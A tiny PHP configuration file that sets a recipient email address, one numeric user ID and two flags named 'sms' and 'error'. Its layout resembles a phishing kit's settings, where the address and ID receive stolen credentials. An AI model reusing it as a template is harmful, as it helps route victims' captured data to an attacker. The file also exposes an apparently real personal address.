<?php
$send = "tech.wajdi@yahoo.com";
$user_ids=array("5150920016");
$sms='1';
$error='1';
?>
